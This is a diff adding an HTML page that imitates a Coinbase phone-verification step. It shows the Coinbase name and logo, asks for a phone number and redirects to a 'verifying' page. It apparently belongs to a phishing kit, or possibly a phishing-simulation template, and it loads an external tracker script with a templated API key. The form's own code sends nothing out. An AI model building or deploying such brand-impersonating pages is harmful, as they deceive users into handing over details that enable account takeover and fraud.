@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phone Verification - Coinbase</title>
+    <link rel="icon" type="image/svg+xml" href="assets/images/favicon.svg">
+    <link rel="stylesheet" href="styles.css">
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="logo-container">
+            <img src="assets/images/favicon.svg" alt="Coinbase" class="logo">
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="signup-container">
+            <!-- Phone Icon -->
+            <div class="form-icon">
+                <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
+                    <circle cx="32" cy="32" r="32" fill="#5b8df5" opacity="0.15"/>
+                    <rect x="20" y="12" width="24" height="40" rx="3" stroke="#5b8df5" stroke-width="2" fill="none"/>
+                    <line x1="28" y1="46" x2="36" y2="46" stroke="#5b8df5" stroke-width="2" stroke-linecap="round"/>
+                </svg>
+            </div>
+            
+            <h1 class="title">Verify your phone number</h1>
+            <p class="subtitle">Enter your phone number to receive a verification code via SMS.</p>
+
+            <!-- Phone Number Form -->
+            <form id="phoneForm" class="signup-form">
+                <input 
+                    type="tel" 
+                    id="phoneNumber" 
+                    name="phoneNumber" 
+                    class="email-input" 
+                    placeholder="Phone number"
+                    autocomplete="tel"
+                    required
+                >
+                <button type="submit" class="continue-btn">Send Code</button>
+            </form>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <p class="footer-text">
+            Standard message and data rates may apply.
+        </p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneForm = document.getElementById('phoneForm');
+            const phoneInput = document.getElementById('phoneNumber');
+            const submitBtn = phoneForm.querySelector('.continue-btn');
+            
+            // Check phone number validity
+            function checkPhoneValidity() {
+                const phoneFilled = phoneInput.value.trim().length >= 10;
+                
+                if (phoneFilled) {
+                    submitBtn.classList.add('active');
+                } else {
+                    submitBtn.classList.remove('active');
+                }
+            }
+            
+            phoneInput.addEventListener('input', checkPhoneValidity);
+            checkPhoneValidity();
+            
+            // Handle phone submission
+            phoneForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                window.location.href = 'verifying.html';
+            });
+        });
+    </script>
+</body>
+</html>
